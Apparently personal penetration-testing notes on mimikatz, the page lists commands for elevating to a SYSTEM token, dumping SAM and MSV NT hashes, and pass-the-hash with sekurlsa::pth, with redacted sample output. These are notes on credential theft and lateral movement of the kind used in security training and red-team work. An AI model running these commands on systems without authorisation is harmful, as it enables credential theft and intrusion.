# mimikatz

### Resources

1. The Hacker Tools

{% embed url="https://tools.thehacker.recipes/mimikatz" %}

### Basic commands

1. View privilege configurations (?):

`privilege::debug`

* Required to perform actions such as `lsadump::sam` later on

```batch
mimikatz # privilege::debug
Privilege '20' OK
```

2. To impersonate a token:

`token::elevate`

* particularly, a token from `SYSTEM`

{% embed url="https://docs.velociraptor.app/artifact_references/pages/windows.detection.impersonation/" %}

```batch
mimikatza # token::elevate

Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

660     xxxx         NT AUTHORITY\SYSTEM     xxxx       (04g,21p)       Primary
 -> Impersonated !
 * Process Token : xxxx     XXXX     xxxx   (12g,24p)  Primary
 * Thread Token  : {0;000003e7} 1 D 1309519     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

```

3. Dump the local Security Account Manager (SAM) NT hashes:

`lsadump::sam`

```batch
mimikatz # lsadump::sam
Domain : xxxx
SysKey : xxxx
Local SID : xxxx

SAMKey : xxxx

RID  : xxxx (500)
User : Administrator
  Hash NTLM: xxxx
  
...
```

4. Dumps NT hash by targeting the [MSV1\_0 Authentication Package](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package):

`lsadump::msv`

```batch
mimikatz # lsadump::msv

Authentication Id : 0 ; xxxx (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : xxxx
Domain            : xxxx
Logon Server      : xxxx
...

        msv :
         [00000003] Primary
         * Username : xxxx
         * Domain   : xxxx
         * NTLM     : xxxx

...
```

5. Revert to original token on mimikatz startup:

`token::revert`&#x20;

```
mimikatz # token::revert
```

6. Performs Pass-the-Hash, Pass-the-Key, Overpass-the-hash:

`sekurlsa::pth`

{% code overflow="wrap" %}
```batch
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nt_hash> /run:"<command_to_run>"
```
{% endcode %}

a. `/user` : username to impersonate

b. `/domain` : fully qualified domain name

c. `/ntlm` : NT hash

d. `/run` : command to run

* according to The Hacker Tools (refer link in "Resources" above), it defaults to `cmd.exe`&#x20;

